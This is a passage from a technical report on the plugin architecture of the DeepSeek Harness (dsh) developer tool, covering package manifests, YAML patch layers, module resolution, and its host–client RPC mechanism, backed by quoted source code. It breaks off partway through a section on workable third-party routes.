# dsh plugin architecture — verified technical report

**Target:** DeepSeek Harness (dsh) `0.1.2-rc.1`, installed at
`/Users/cgeng/.nvm/versions/node/v24.19.0/lib/node_modules/@deepseek-ai/dsh/`.

**Evidence policy.** Every claim below is marked:

- **[READ]** — read from installed code (path + line/snippet given). Packages are installed as symlinks at
  `$PROFILES = /Users/cgeng/.dsh/profiles/node_modules/@deepseek-ai/` → `$REAL = /Users/cgeng/.nvm/versions/node/v24.19.0/lib/node_modules/@deepseek-ai/dsh/node_modules/@deepseek-ai/`.
  Both roots are the same bytes; this report cites `$PROFILES`-relative names.
- **[RAN]** — actually executed and observed on this machine (a sandboxed `$DSH_HOME` inside the workspace,
  plus a real browser via the Kimi WebBridge daemon).
- **UNKNOWN** — could not confirm from real code.

**A large part of this report is backed by a working third-party plugin that was built and mounted during
this investigation** — see [Appendix A](#appendix-a--verified-end-to-end-demo). Everything in Appendix A is
**[RAN]**, not inferred.

> **Trap worth knowing first.** `$PROFILES` is a directory of *symlinks*. `rg`/`grep -r` silently return
> **zero hits** on it without `--follow`. Use the real tree, or `rg --follow`.

---

## 0. The 30-second model

A dsh profile is an **ordered stack of YAML patch layers** over an empty entry list. Each layer comes from a
"bundle" package declaring `dsh.bundle.patch`. The composed list is handed to a vendored Cordis
`Loader`, which imports and starts each row. A plugin is therefore:

1. an npm package whose manifest declares `dsh.bundle.patch` → a `cordis.patch.yml` that `insert`s a row;
2. a host ESM module (object-plugin or `Service` subclass) that the Loader imports;
3. *optionally* a browser half: `exports["./client"]` + `dsh.client.platform: "web"`, served by the host as a
   plain classic script that calls `window.__ModuleLoader__.load({id, factory})`.

There is no separate plugin API, no registry, and no install command beyond `pnpm` in the profile directory.

---

## 1. PLUGIN SHAPE

### 1.1 Real reference plugin (host-only, third-party, works today)

The only third-party plugin already installed here is `dsh-sidekick`, linked into the web profile from
`/Users/cgeng/.dsh/workspaces/dsh-mobile/plugin/`. Its `package.json` **[READ]**:

```json
{
  "name": "dsh-sidekick",
  "type": "module",
  "main": "lib/index.mjs",
  "exports": {
    ".": { "types": "./lib/index.d.mts", "default": "./lib/index.mjs" },
    "./package.json": "./package.json"
  },
  "files": ["lib", "cordis.patch.yml", "README.md"],
  "dsh": { "bundle": { "patch": "./cordis.patch.yml" } },
  "peerDependencies": {
    "@deepseek-ai/cordis": "^4.0.0",
    "@deepseek-ai/schemastery": "^3.18.0",
    "@deepseek-ai/dsh-host-webserver": "0.1.1-rc.2"
  },
  "peerDependenciesMeta": {
    "@deepseek-ai/cordis": { "optional": true },
    "@deepseek-ai/schemastery": { "optional": true },
    "@deepseek-ai/dsh-host-webserver": { "optional": true }
  }
}
```

Its whole bundle patch, `cordis.patch.yml` **[READ]**:

```yaml
# dsh-sidekick bundle patch: 在 web profile 中插入插件行。
# 插件通过 class 的 static inject 声明 ['webServer']，这里不需要重复 inject。
- insert:
    - id: dsh-sidekick
      name: dsh-sidekick
```

Its host entry `src/index.ts` (built to `lib/index.mjs`) **[READ]**:

```ts
import { Service } from '@deepseek-ai/cordis'
import type { Context } from '@deepseek-ai/cordis'
import Schema from '@deepseek-ai/schemastery'

export const Config: Schema<Config> = Schema.object({
  prefix: Schema.string().default('/sidekick'),
  codeTtlMs: Schema.natural().default(300_000),
  deviceDir: Schema.string().default(defaultDeviceDir()),
  maxBodyBytes: Schema.natural().default(4 * 1024 * 1024),
})

export class Sidekick extends Service {
  static inject = ['webServer' as const]
  static Config = Config

  constructor(ctx: Context, private readonly config: Config) {
    super(ctx, 'sidekick')
    …
  }

  protected async [Service.init](): Promise<void> {
    …
    this.ctx.effect(() => this.ctx.webServer.register(r), `sidekick: route ${r.path}`)
  }
}

export default Sidekick
```

Note: **no `export const name`, no `export apply`** — this is the class form. `static Config` is the Cordis
per-fiber config schema; `static inject` is the service list; `export default` is the plugin value.

### 1.2 Real reference plugin (host + client, first-party)

Every `dsh-client-ui-*` package is a "dual-face" package. `dsh-client-ui-goal/package.json` **[READ]**:

```json
{
  "name": "@deepseek-ai/dsh-client-ui-goal",
  "type": "module",
  "main": "lib/index.js",
  "exports": {
    ".":        { "types": "./lib/types/index.d.ts",        "default": "./lib/index.js" },
    "./client": { "types": "./lib/types/client/index.d.ts", "default": "./lib/client.js" },
    "./src/*": "./src/*",
    "./package.json": "./package.json"
  },
  "dsh": {
    "client": {
      "inject": [
        "@deepseek-ai/dsh-api-remotes",
        "@deepseek-ai/dsh-api-session-controller",
        "@deepseek-ai/dsh-client-locale",
        "@deepseek-ai/dsh-client-ui-chat",
        "@deepseek-ai/dsh-client-ui-conversation",
        "@deepseek-ai/dsh-client-ui-renderer",
        "@deepseek-ai/dsh-client-ui-session"
      ],
      "platform": "web"
    }
  },
  "peerDependencies": { "@deepseek-ai/cordis": "^4.0.2" }
}
```

`lib/index.js` (host half) is 404 bytes — it is a **no-op host face**; the real content is in `lib/client.js`.
`lib/client.js` (browser half) head and tail **[READ]**:

```js
window.__ModuleLoader__.load({
	id: "@deepseek-ai/dsh-client-ui-goal",
	factory: (require) => {
		var module = { exports: {} };
		var exports = module.exports;
		Object.defineProperty(exports, Symbol.toStringTag, { value: "Module" });
		let react_jsx_runtime = require("react/jsx-runtime");
		let react = require("react");
		let _deepseek_ai_dsh_client_ui_primitives = require("@deepseek-ai/dsh-client-ui-primitives");
		…
		/** Required services for the Goal dock, command-input projection, Remote mutations, and copy. */
		const inject = [
			"slots",
			"sessions",
			"remote",
			"remote.goals",
			"locale",
			"uiConversation"
		];
		function apply(ctx) { … ctx.slots.inject("conversation.input.dock", () => ctx.slots.register({…}, GoalDock)) }
		exports.apply = apply;
		exports.inject = inject;
		return module.exports;
	}
});

//# sourceMappingURL=client.js.map
```

### 1.3 Exhaustive `package.json` field reference

| Field | Required | Meaning | Evidence |
|---|---|---|---|
| `dsh.bundle.patch` | for a **bundle** (a profile layer) | Path (relative to package root) of the `cordis.patch.yml` this package contributes as a layer. | `dsh-app-boot/lib/index.js:868` **[READ]** |
| `dsh.client.platform` | for a browser half | Must be the string `"web"` or the package is ignored. | `dsh-client-modules/lib/index.js:631` **[READ]** |
| `dsh.client.inject` | optional `string[]` | **Bundle-arrival order**, *not* Cordis injection: package ids of other client bundles to fetch first. | `dsh-client-modules/lib/client.js:265` **[READ]** |
| `dsh.client.external` | optional `string[]` | Specifiers your bundle `require`s that are *other packages'* `./client` artifacts and must be awaited before materialization. | see §1.7 |
| `dsh.client.immediately` | optional `boolean` | Prefetch in the stage-one (bootstrap) tier before the app mounts. | `dsh-client-modules/lib/client.js:110` |
| `exports["."]` | yes | Host entry. | all packages |
| `exports["./client"]` | for a browser half | Browser entry. **Required if `dsh.client` is declared** — otherwise boot throws. | `dsh-client-modules/lib/index.js:636` **[READ]** |
| `exports["./typert"]` | only for generated remotes | Host Typert manifest. | §3 |
| `exports["./remote"]` | only for generated remotes | Client Typert contribution. | §3 |

The failure thrown when `dsh.client` is declared but `./client` is missing **[READ]**, `dsh-client-modules/lib/index.js:636`:

```js
if (clientRel === void 0) throw new Error(`client-modules: ${packageName} declares dsh.client but exports no "./client" bundle`);
```

`dsh.client` is validated field-by-field **[READ]**, `dsh-client-modules/lib/index.js:139-154`:

```js
function parseDshClient(pkgName, value) {
	if (value === void 0) return void 0;
	if (typeof value !== "object" || value === null) throw new Error(`client-modules: ${pkgName} has a non-object dsh.client declaration`);
	const decl = value;
	if (typeof decl.platform !== "string") throw new Error(`client-modules: ${pkgName} dsh.client.platform must be a string`);
	const inject = optionalStringArray(pkgName, "dsh.client.inject", decl.inject);
	const external = optionalStringArray(pkgName, "dsh.client.external", decl.external);
	if (decl.immediately !== void 0 && typeof decl.immediately !== "boolean") throw new Error(`client-modules: ${pkgName} dsh.client.immediately must be a boolean`);
	return { platform: decl.platform, … };
}
```

### 1.4 Host-side plugin forms accepted by the Loader

`EntryTree.unwrapExports` **[READ]**, `cordis-plugin-loader/lib/index.js`:

```js
unwrapExports(exports) {
	if (isNullable(exports)) return exports;
	exports = exports.default ?? exports;
	if (!exports.__esModule) return exports;
	return exports.default ?? exports;
}
```

So the module may export (a) `export default <plugin>`, (b) named exports used as an object plugin
(`export const name`, `export const inject`, `export const Config`, `export function apply`), or (c) a mix.
`ctx.registry.plugin(plugin, config, …)` accepts a function, a class (instantiated as a Service), or an object
with `apply`. The row's `config` is validated against `Config` and passed to `apply(ctx, config)` /
the constructor.

**Loader row options** — `EntryOptions` **[READ]**, `cordis-plugin-loader/src/config/entry.ts:8-22`:

```ts
export interface EntryOptions {
  /** Stable id inside the containing entry tree. */
  id: string
  /** Module specifier imported by the entry tree. */
  name: string
  /** Config passed to the plugin. */
  config?: any
  /** Marks this entry as a nested group. */
  group?: boolean | null
  /** Prevents this entry and descendants from running. */
  disabled?: boolean | null
  /** Required services or service intercept config for this entry. */
  inject?: Inject | null
}
```

### 1.5 How the plugin id resolves to a module

`EntryTree.import` **[READ]**, `cordis-plugin-loader/src/config/tree.ts`:

```ts
import(name: string, getOuterStack?: () => string[]) {
  if (name.startsWith('cordis:')) {
    return this.ctx.loader.builtins[name.slice(7)]
  }
  return composeError(async (info) => {
    info.offset += 3
    if (this.ctx.loader.internal) {
      return await this.ctx.loader.internal.import(name, this.ctx.baseUrl!, {})
    } else if (name.startsWith('.')) {
      return await import(/* @vite-ignore */new URL(name, this.ctx.baseUrl).href)
    } else {
      return await import(/* @vite-ignore */name)
    }
  }, getOuterStack)
}
```

`this.ctx.baseUrl` for the root include is the **profile directory** — set by `Include`'s constructor
**[READ]**, `dsh-app-boot/lib/index.js`:

```js
this.ctx.baseUrl = new URL(".", pathToFileURL(this.filename)).href;
```

where `filename` is `$DSH_HOME/profiles/<name>/cordis.yml`. Bare specifiers therefore resolve through
Node's ordinary ESM resolution starting at the profile directory (profile `node_modules` → the shared
`$DSH_HOME/profiles/node_modules` → up).

Relative names in `insert` rows are rewritten to `file:` URLs relative to **the patch file's own directory**
**[READ]**, `dsh-app-boot/lib/index.js:1135-1142`:

```js
function anchorInsertedPluginNames(patches, file) {
	const base = dirname(resolve(file));
	const visit = (entry) => {
		if (typeof entry.name === "string" && (entry.name.startsWith("./") || entry.name.startsWith("../"))) entry.name = pathToFileURL(resolve(base, entry.name)).href;
		if (entry.group && Array.isArray(entry.config)) entry.config.forEach(visit);
	};
	for (const patch of patches) patch.insert?.forEach(visit);
	return patches;
}
```

### 1.6 Imports available inside the browser `factory`

`require(...)` inside a bundle factory resolves against a **runtime module table**, not node_modules.
The seed words are baked into the web shell — `dsh-web-frontend/dist/assets/index-Df-65__b.js` **[READ]**:

```js
function zp(){return{
  react:q5,
  "react/jsx-runtime":Y5,
  "react-dom":n6,
  "react-dom/client":o6,
  "@deepseek-ai/cordis":M5,
  "@deepseek-ai/dsh-client-store":M6,
  "@deepseek-ai/dsh-client-ui-slots":T6,
  "@deepseek-ai/dsh-client-ui-primitives":Fp
}}
```

That is the **complete** seed list. `@deepseek-ai/dsh-client-ui-slots`, `@deepseek-ai/dsh-client-store` and
`@deepseek-ai/dsh-client-ui-primitives` are **not installed as packages anywhere** — they ship only inlined
in the shell bundle. Type-level shapes leak through `.d.ts` imports in installed packages; the runtime is the
shell's copy.

Anything else must be:
- another plugin's `./client` artifact (declare it in `dsh.client.external` or `dsh.client.inject`), or
- inlined into your own bundle by your bundler.

Resolution order is explicit and fail-loud **[READ]**, `dsh-client-modules/lib/client.js`:

```js
makeRequire(edges) {
  return (spec) => {
    edges.add(spec);
    if (this.seed.has(spec)) return this.seed.get(spec);
    const id = stripClientSuffix(spec);
    const record = this.loadCache.get(id);
    if (record !== void 0) return record.exports;
    if (this.factories.has(id)) return this.materialize(id).exports;
    throw new Error(`client-modules: require("${spec}") missed the module table — not a platform seed word, not a materialized module, and no registered package factory (a build-time externals drift, or a dynamic dependency that did not arrive)`);
  };
}
```

### 1.7 `dsh.client.inject` vs the runtime `inject` export — the #1 confusion

They are different mechanisms and both matter:

| | `dsh.client.inject` (package.json) | `exports.inject` (in `lib/client.js`) |
|---|---|---|
| What it is | Bundle **fetch order**: `arriveGraphRow` for each listed package before yours | **Cordis service injection** for your fiber |
| Values | package ids (`"@deepseek-ai/dsh-client-ui-conversation"`) | service keys (`"slots"`, `"remote.goals"`, `"locale"`) |
| If wrong | your bundle loads but a `require` misses the table | fiber stays `pending (waiting for service …)` forever |

**[READ]** `dsh-client-modules/lib/client.js` (arrival):

```js
for (const packageName of row.inject) {
  const dependency = this.graphRows.get(packageName);
  if (dependency !== void 0) await this.arriveGraphRow(dependency, [], visited);
}
```

**[RAN]** the shell's failure text, printed by `assertEntriesActive` in the web kernel:
`<name>: pending (waiting for service<s>: <keys>)`.

---

## 2. INSTALLING / MOUNTING A CUSTOM PLUGIN IN THE `web` PROFILE

### 2.1 How the profile is composed

`runProfile` **[READ]**, `dsh/lib/profile-boot-BTzzdrGY.js`:

```js
const composeLive = () => structuredClone([
  ...composed.bundlePatches,                                    // each dsh.profile.bundles entry, in order
  ...loadOptionalPatches(NAME, composed.profile.patchPath) ?? [], // $DSH_HOME/profiles/web/cordis.patch.yml
  ...loadOptionalPatches(NAME, homePatchPath()) ?? [],            // $DSH_HOME/cordis.patch.yml
  ...composed.overlays                                            // --patch files, then the telemetry switch
]);
const ctx = await boot(NAME, rootConfig, structuredClone(allPatches(composed)), (hostCtx) => { … });
```

The root config file `$DSH_HOME/profiles/web/cordis.yml` is **rewritten to `[]` on every boot**
**[READ]**, `prepareProfile` — it exists only to anchor `baseUrl`. **Never edit it.**

The flattened layer list is applied by one `applyEntryPatches` call over `[]` **[READ]**,
`dsh-app-boot/lib/index.js:59-110`:

```js
function applyEntryPatches(data, patches, warn) {
	data = structuredClone(data);
	if (!patches?.length) return data;
	const entryMap = new Map();
	const buildMap = (entries) => {
		for (const entry of entries) {
			if (entry.id) entryMap.set(entry.id, entry);
			if (entry.group && Array.isArray(entry.config)) buildMap(entry.config);
		}
	};
	buildMap(data);
	for (const patch of patches) {
		const { id, insert, name, ...overrides } = patch;
		if (insert) {
			if (id) {
				const target = entryMap.get(id);
				if (!target) { warn("patch insert: entry %C not found", id); continue; }
				if (!target.group) { warn("patch insert: entry %C is not a group", id); continue; }
				if (!Array.isArray(target.config)) target.config = [];
				target.config.push(...insert);
			} else data.push(...insert);
			buildMap(insert);
			continue;
		}
		if (!id) { warn("patch: id is required for non-insert patches"); continue; }
		const target = entryMap.get(id);
		if (!target) { warn("patch: entry %C not found", id); continue; }
		if (name && name !== target.name) { warn("patch: name mismatch for %C (expected %C, got %C), skipping", id, target.name, name); continue; }
		for (const [key, value] of Object.entries(overrides)) { if (key === "id") continue; target[key] = value; }
	}
	return data;
}
```

Patch semantics, precisely:

| Form | Effect |
|---|---|
| `- id: X` + `config: {…}` | **Replaces the whole `config` object** of row `X` (not a merge). |
| `- id: X` + `disabled: true` | Disables row `X` and all descendants. |
| `- id: X` + `inject: […]` | Replaces the row's `inject`. |
| `- id: X` + `name: Y` | Mismatch → warning, patch skipped (a guard against id collisions). |
| `- insert: [rows]` | Appends rows to the **root** entry list. |
| `- id: G` + `insert: [rows]` | Appends rows into group entry `G`'s `config` array; warns if `G` is missing or is not a group. |

A patch that names a **missing id** is a per-row Loader warning, not a boot failure — that is deliberate
("one overlay shared across surfaces does not have to match every tree"). A patch file that is **unparsable,
missing, or not a top-level array** is a hard boot failure **[READ]**, `loadOverlayPatches`/`parsePatchList`.

### 2.2 `!!js` expressions

Enabled by a custom YAML type **[READ]**, `dsh-app-boot/lib/index.js:17-31`:

```js
const JsExpr = new yaml.Type("tag:yaml.org,2002:js", {
  kind: "scalar",
  construct: (node) => ({ __jsExpr: node }),
  …
});
const entryListSchema = yaml.JSON_SCHEMA.extend(JsExpr);
```

Evaluation **[READ]**, `cordis-plugin-loader/src/config/utils.ts`:

```ts
export const evaluate = new Function('ctx', 'expr', `
  with (ctx) {
    return eval(expr)
  }
`) as ((ctx: object, expr: string) => any)
```

It is evaluated **against the loader context** of the row that owns the value, and only when that fiber is
created. Scope includes:

- everything provided on the root context — notably `dshHomePath`, provided in `boot()`
  **[READ]**: `ctx.provide("dshHomePath", dshHomePath)`;
- any Cordis **service** available in that fiber's context (`ctx.webStartup.port`, `ctx.webRuntime.trustedHosts`);
- globals (`process.env.…`, `JSON`, …).

Real examples from the installed tree:

```yaml
# $DSH_HOME/profiles/web/cordis.patch.yml  [READ]
- id: session-query-sqlite
  config:
    path: !!js dshHomePath('session-query.sqlite')
    openAt: first-search
```

```yaml
# @deepseek-ai/dsh-web-app/cordis.patch.yml  [READ]
- id: webserver
  config:
    host: !!js ctx.webStartup.host ?? '127.0.0.1'
    port: !!js ctx.webStartup.port ?? 3080
- id: tools
  config:
    mode: !!js process.env.DSH_TOOLS_MODE
```

Ordering caveat: a row whose config uses `!!js ctx.<service>` must `inject` that service, otherwise the
expression throws at fiber creation. That is why the shipped rows carry `inject: [webStartup]` **[READ]**.

### 2.3 Case (a) — an npm package installed with `dsh plugin`

`dsh plugin --profile web add <pkg>` is a **thin pnpm forwarder with a reconcile step** **[READ]**,
`dsh/lib/plugin-F7ZVfRyo.js`:

```js
function runPlugin(profile, args) {
	const dir = resolveProfileDir(profile);
	if (!existsSync(join(dir, "package.json"))) {
		const template = PROFILE_TEMPLATES[profile];
		initProfile(dir, template?.bundles ?? DEFAULT_PROFILE_BUNDLES, template?.patchReload);
		process.stderr.write(`${NAME}: initialized profile ${profile} at ${dir}\n`);
	}
	const before = readProfileManifest(NAME, dir);
	const result = spawnSync("pnpm", args.map((argument) => anchorPathSpec(argument, process.cwd())), {
		cwd: dir, stdio: "inherit", shell: process.platform === "win32"
	});
	…
	if (exitCode === 0) reconcilePlugins(before, dir);
	…
}
```

`reconcilePlugins` **[READ]** then reconciles `dsh.profile.bundles` against *installed state*, not against a
dependency diff:

```js
for (const packageName of dependencies) {
	const isBundle = exportsPatch(packageName, profileDir);
	if (isBundle && !plugins.includes(packageName)) { plugins.push(packageName); changed = true; }
	else if (!isBundle && !beforeDeps.has(packageName)) process.stderr.write(`${NAME}: warning: ${packageName} declares no dsh.bundle — installed as a plain dependency, not a profile layer …\n`);
}
```

`exportsPatch` resolves the dependency and reads its `dsh.bundle.patch` **[READ]**:

```js
function exportsPatch(packageName, profileDir) {
	let dir;
	try { dir = resolveBundleDir(NAME, packageName, INSTALL_ANCHOR, profileDir); } catch { return false; }
	return readProfileManifest(NAME, dir).dsh?.bundle?.patch !== void 0;
}
```

So for case (a) you run **one command** and nothing else:

```sh
dsh plugin --profile web add my-dsh-plugin
```

and dsh itself appends `"my-dsh-plugin"` to `$DSH_HOME/profiles/web/dsh.profile.bundles`. Restart the server
afterwards — plugin rows mount at boot.

Two gotchas read from the same file:

- relative path specs are re-anchored to the *invoking* directory before pnpm sees them, so
  `dsh plugin --profile web add .` from a checkout does the right thing (`anchorPathSpec`);
- git-hosted plugins build via `prepare`, which **pnpm blocks** until the exact key is listed under
  `allowBuilds` in `$DSH_HOME/profiles/web/pnpm-workspace.yaml`. dsh prints that instruction on failure.

### 2.4 Case (b) — a local directory developed in place

This is the **same mechanism**; you just skip pnpm. Two equivalent routes.

**Route 1 (recommended, identical to `dsh plugin add`):** point pnpm at the directory once —

```sh
dsh plugin --profile web add /Users/cgeng/Workspaces/dsh-plan/my-plugin
```

which writes into `/Users/cgeng/.dsh/profiles/web/package.json`:

```json
{
  "name": "dsh-profile-web",
  "private": true,
  "dependencies": {
    "my-plugin": "link:/Users/cgeng/Workspaces/dsh-plan/my-plugin"
  },
  "dsh": {
    "profile": {
      "bundles": [
        "@deepseek-ai/dsh-base",
        "@deepseek-ai/dsh-web-app",
        "my-plugin"
      ]
    }
  }
}
```

and symlinks `$DSH_HOME/profiles/web/node_modules/my-plugin` → the directory.

**Route 2 (manual, what was actually done for the verification in Appendix A):** edit the two files by hand —

1. add the dependency line to `dependencies`;
2. **append the package name to `dsh.profile.bundles`** (this is the step that actually mounts it);
3. put a symlink at `$DSH_HOME/profiles/web/node_modules/<name>` → your directory.

`cordis.patch.yml` needs **no** edit if your own bundle patch already `insert`s your row — which is the point
of `dsh.bundle.patch`: a plugin's *own* patch travels with the plugin. Edit the profile's `cordis.patch.yml`
only to override a row you do not own:

```yaml
# $DSH_HOME/profiles/web/cordis.patch.yml  — your layer, applied after every bundle layer
- id: ui-schedule
  disabled: false                      # re-enable a row a bundle disabled

- id: some-shipped-row
  config:
    someKey: !!js process.env.MY_KEY   # replaces that row's WHOLE config
```

> **Do not add your own `- insert:` row here as well.** If you do, the row inserts twice: once from your
> bundle patch (which is applied first) and once from the profile layer. Both rows have the same `id`, and
> `EntryTree.create` will throw on the duplicate. **UNKNOWN:** the exact error text — not exercised.

**Case (b), dependency-resolution gotcha (verified by reading, not by hitting it):** a `link:`-ed plugin is
symlinked into the profile, but Node resolves ESM imports against the module's **realpath**. So your plugin's
own `import '@deepseek-ai/schemastery'` resolves from *your* directory upward — not from the profile. The
dsh installation's dependency closure is **not** automatically visible. This is why `dsh-sidekick` ships a
`node_modules/` and a `package-lock.json` **[READ]**. Practical rule: **run `npm install` (or pnpm) inside
your plugin directory**, and keep `@deepseek-ai/*` in `peerDependencies` (sidekick additionally marks them
`optional` so a plain `npm install` does not try to fetch them).

### 2.5 The composed `web` tree (real, from this machine)

`dsh --profile web --dump-config` composes the layers **without booting and without evaluating `!!js`**
**[READ]** (`runDumpConfig`). Running it against a sandbox `$DSH_HOME` reproduced the real composition
**[RAN]**; excerpt (525 rows total):

```yaml
# == @deepseek-ai/dsh-base
- id: timer
  name: '@deepseek-ai/cordis-plugin-timer'
- id: llm
  name: '@deepseek-ai/dsh-llm'
- id: typert
  name: '@deepseek-ai/dsh-typert-registry'
- id: typert-loader
  name: '@deepseek-ai/dsh-typert-loader'
- id: typert-gateway
  name: '@deepseek-ai/dsh-api-gateway'
- id: settings
  name: '@deepseek-ai/dsh-settings-file'
- id: credentials
  name: '@deepseek-ai/dsh-credentials-local'
- id: llm-pi-ai
  name: '@deepseek-ai/dsh-llm-pi-ai'
- id: session-persistence-jsonl
  name: '@deepseek-ai/dsh-session-persistence-jsonl'
  config:
    root: !!js dshHomePath('sessions')
…
# == @deepseek-ai/dsh-web-app
- id: webserver
  name: '@deepseek-ai/dsh-host-webserver'
  inject:
    - webStartup
  config:
    host: !!js ctx.webStartup.host ?? '127.0.0.1'
    port: !!js ctx.webStartup.port ?? 3080
- id: web-runtime
  name: '@deepseek-ai/dsh-web-app'
- id: client-hmr
  name: '@deepseek-ai/dsh-client-hmr'
- id: modules
  name: '@deepseek-ai/dsh-client-modules'
- id: api-remotes
  name: '@deepseek-ai/dsh-api-remotes'
- id: ui-layout
  name: '@deepseek-ai/dsh-client-ui-layout'
- id: ui-conversation
  name: '@deepseek-ai/dsh-client-ui-conversation'
- id: ui-model-selection
  name: '@deepseek-ai/dsh-client-ui-model-selection'
…
# == <your bundle>                     ← your patch layer lands here
- id: my-plugin
  name: my-plugin
# == $DSH_HOME/profiles/web/cordis.patch.yml   ← then the profile layer
# == $DSH_HOME/cordis.patch.yml                ← then the home layer
# == <--patch file>                            ← then each overlay, then the telemetry switch
```

Layer application order is exactly `bundles → profile → home → --patch overlays → telemetry switch`
**[READ]**, `allPatches`/`composeProfile`. Later layers win.

---

## 3. HOST ↔ CLIENT: the Typert Remote mechanism

### 3.1 What it is

Not a Proxy. A host Cordis service is marked up with decorators (or hand-written descriptors), a gateway
claims `<namespace>/<method>` endpoints on the shared `/api` channel, and each mounted namespace becomes a
Cordis service literally named `remote.<namespace>` on the client.

Package map:

| Package | Role |
|---|---|
| `dsh-typert-protocol` | Decorators `Remote`/`RemoteScope`, `TypertRemoteService`, `bindTypertRemote`, `RemoteError`, wire types |
| `dsh-typert-registry` | Service key `typert`; sub-registries `local`/`remotes`/`lookups`/`contexts` |
| `dsh-typert-loader` | Host-only plugin; scans Loader entries, imports each package's `./typert`, registers it |
| `dsh-api-gateway` | Host: `typertGateway` + RPC interceptor on `/api`. Client: `remote` (`$mount`/`$on`/`$stream`/`$host`) |
| `dsh-api-remotes` | The app's BFF: chooses which remotes the client mounts |
| `dsh-client-connection` | The `/api` wire: envelopes, auth cookie, reconnect |

### 3.2 Transport

**Unary: `POST /api/<namespace>/<method>`** — no new port, no separate server. Client caller
**[READ]**, `dsh-client-connection/lib/client.js:4606`:

```js
async call(channel, endpoint, payload, signal) {
  assertTarget(channel, endpoint);
  const rpcId = RpcId(randomUuid());
  const message = { type: "client-request", rpcId, method: endpoint, payload };
  const response = await send(new URL(`${channel}/${endpoint}`, resolveBase()), {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(message),
    ...signal === undefined ? {} : { signal }
  });
  …
}
```

Envelope schemas **[READ]**, `dsh-client-connection/lib/index.js:478-492`:

```js
const clientRequestSchema = z$1.object({
	type: z$1.literal("client-request"),
	rpcId: rpcIdSchema,
	method: z$1.string(),
	payload: z$1.unknown()
});
const serverResponseSchema = z$1.object({
	type: z$1.literal("server-response"),
	rpcId: rpcIdSchema,
	result: z$1.result(rpcResultSchema(z$1.unknown().optional()))
});
```

Host registration **[READ]**, `dsh-api-gateway/lib/index.js:448-456`:

```js
ctx.inject(["connection"], (connectionCtx) => {
  connectionCtx.connection.rpc.intercept(
    "/api",
    (endpoint) => this.claimsEndpoint(endpoint),
    (endpoint, payload, signal) => this.dispatchRpc(endpoint, payload, signal)
  );
});
```

**Streams: WebSocket `/api/remote.mux`** **[READ]**, `dsh-api-gateway/lib/index.js:11`.

Auth: every `/api` request is bearer-cookie authenticated and Host-fenced — `requestRejection` returns 403
for an untrusted authority and 401 for a missing browser session. There is no method-specific loopback tier
**[READ]**, `dsh-client-connection/lib/index.js:529`.

### 3.3 Host side — declaring remote methods

Decorators only leave a **marker** on the prototype; the wire contract comes from generated descriptors
**[READ]**, `dsh-typert-protocol/lib/index.js:56`:

```js
const REMOTE_METHOD_DESCRIPTOR = "@deepseek-ai/dsh-typert-protocol/remote-methods";
```

Real host service **[READ]**, `dsh-api-settings-controller/lib/index.js:146`:

```js
super(ctx, "credentialsController", { namespace: "credentials" });
```

Note the three distinct names: Cordis service key `credentialsController`, **wire namespace** `credentials`,
client Cordis key `remote.credentials`.

The gateway **enforces** consistency at call time **[READ]**, `dsh-api-gateway/lib/index.js:1043-1050`:

```js
function validateBinding(receiver, serviceKey, namespace, endpoint) {
	const original = originalOf(receiver);
	const value = Reflect.get(original, "typertRemote");
	if (value === void 0) throw new TypertGatewayError("gateway/binding-invalid", endpoint, `Service ${JSON.stringify(serviceKey)} has no visible typertRemote binding`);
	return { binding: readBinding(value, original, serviceKey, endpoint, namespace), original };
}
```

`descriptor.service` must equal the service key; `descriptor.namespace` must equal the binding namespace
(default = service key). Namespace/wire names must match `/^[A-Za-z0-9_$.-]+$/` and must not be `.`/`..`
**[READ]**, `dsh-typert-registry/lib/index.js:567`.

### 3.4 Client side — mounting and calling

`ctx.remote.<namespace>.<method>(...args) → Promise<RemoteResult<T>>`, where
`RemoteResult<T> = {ok:true, value:T} | {ok:false, error}`. **Unary calls never reject for a carrier
problem** — they resolve to `{ok:false}` **[READ]**, `dsh-api-gateway/lib/client.js:1594-1615`:

```js
const result = await connection.rpc.call("/api", endpoint, { args: prepared.args }, prepared.signal);
if (!mountActive(token)) return withdrawn(endpoint);
if (!result.ok) return { ok: false, error: rebuiltFailure(result.error) };
return { ok: true, value: result.value };
…
} catch (error) {
  if (prepared.signal.aborted) return cancelledFailure(endpoint, error);
  return carrierFailure(endpoint, error);
}
```

Namespace service key **[READ]**, `dsh-api-gateway/lib/client.js:1778`:

```js
function remoteServiceKey(namespace) { return `remote.${namespace}`; }
```

Method installation is `Object.defineProperty`, explicitly **not** a Proxy **[READ]**:

```js
Object.defineProperty(this, method, {
  configurable: true, enumerable: true,
  get: function() {
    const callerCtx = this.ctx;
    const current = this.methods.get(method);
    const direct = current?.direct, scoped = current?.scoped;
    return (...args) => this.invokeRemote(direct, scoped, callerCtx, args);
  }
});
```

Client API surface **[READ]**, `dsh-typert-protocol/lib/types/types.d.ts:229-247`:

```ts
export interface TypertClientRemote extends TypertRemoteNamespaceMap {
    $mount(contribution: TypertRemoteContribution): Promise<TypertDisposer>;
    $on<Event extends TypertRemoteEvent>(event: Event, listener: TypertClientEventListener<Event>): () => void;
}
```

plus `$stream(options)` and `get $host()`. **There is no `useRemote(...)` hook and no `api.settings.get(...)`.**

### 3.5 ⚠️ The blocker for third-party remotes

The Typert **generator is not installed anywhere.** `ls` over both roots shows only
`dsh-typert-protocol`, `dsh-typert-registry`, `dsh-typert-loader`. Every generated artifact is headed
`/* Generated by @deepseek-ai/dsh-typert-generator from FaceModel — do not edit. */`, and the READMEs link to
a `../generator/README.md` that does not exist locally **[READ]**.

Second blocker: `dsh-api-remotes/lib/client.js` mounts a **fixed, build-time list of exactly 12 bundled
contributions** **[READ]**, `dsh-api-remotes/lib/client.js:8886-8919`:

```js
const inject = ["remote"];
async function apply(ctx) {
	const disposers = [];
	try {
		for (const contribution of [
			TYPERT_REMOTE$11, TYPERT_REMOTE$10, TYPERT_REMOTE$9, TYPERT_REMOTE$8,
			TYPERT_REMOTE$7,  TYPERT_REMOTE$6,  TYPERT_REMOTE$5, TYPERT_REMOTE$4,
			TYPERT_REMOTE$3,  TYPERT_REMOTE$2,  TYPERT_REMOTE$1, TYPERT_REMOTE
		]) disposers.push(await ctx.remote.$mount(contribution));
	} catch (error) { … }
	…
}
```

Its README states it plainly: *"The capability set is fixed by explicit build-time value imports; the Client
does not discover the Host's active Services or Remote definitions at runtime."* — **a third-party package's
`./remote` artifact is NOT auto-discovered.**

### 3.6 The two routes that DO work for a third party

**Route A — run your own host method behind the shell's HTTP server.** This is what the verified demo does,
